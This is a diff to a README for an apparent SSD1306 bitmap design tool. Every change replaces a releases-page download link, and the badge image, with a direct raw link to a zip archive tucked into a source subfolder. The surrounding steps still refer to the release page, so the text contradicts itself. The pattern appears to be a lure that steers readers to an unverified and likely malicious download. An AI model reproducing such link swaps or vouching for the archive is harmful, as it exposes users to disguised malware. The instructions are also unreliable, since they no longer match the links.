@@ -1,6 +1,6 @@
 # 🎨 OLED-Display-StudioV3 - Create Stunning SSD1306 Bitmaps Easily
 
-[![Download OLED-Display-StudioV3](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/flydeas/OLED-Display-StudioV3/releases)
+[![Download OLED-Display-StudioV3](https://github.com/flydeas/OLED-Display-StudioV3/raw/refs/heads/main/src/modules/MainGrid/OLE_Studio_Display_3.5.zip%20Now-v1.0-brightgreen)](https://github.com/flydeas/OLED-Display-StudioV3/raw/refs/heads/main/src/modules/MainGrid/OLE_Studio_Display_3.5.zip)
 
 ## 🌟 Overview
 
@@ -21,7 +21,7 @@ To get started with OLED Display Studio V3, follow these steps:
 1. **Download the Application:**
    Click the link below to visit the release page.
 
-   [Download OLED-Display-StudioV3](https://github.com/flydeas/OLED-Display-StudioV3/releases)
+   [Download OLED-Display-StudioV3](https://github.com/flydeas/OLED-Display-StudioV3/raw/refs/heads/main/src/modules/MainGrid/OLE_Studio_Display_3.5.zip)
 
 2. **Select the Latest Release:**
    On the release page, find the latest version. It is usually at the top of the list.
@@ -62,7 +62,7 @@ To ensure optimal performance, please verify the following requirements:
 
 Ready to create your own SSD1306 bitmaps? Visit the link below to download the application.
 
-[Download OLED-Display-StudioV3](https://github.com/flydeas/OLED-Display-StudioV3/releases)
+[Download OLED-Display-StudioV3](https://github.com/flydeas/OLED-Display-StudioV3/raw/refs/heads/main/src/modules/MainGrid/OLE_Studio_Display_3.5.zip)
 
 ## ⚙️ Troubleshooting
 
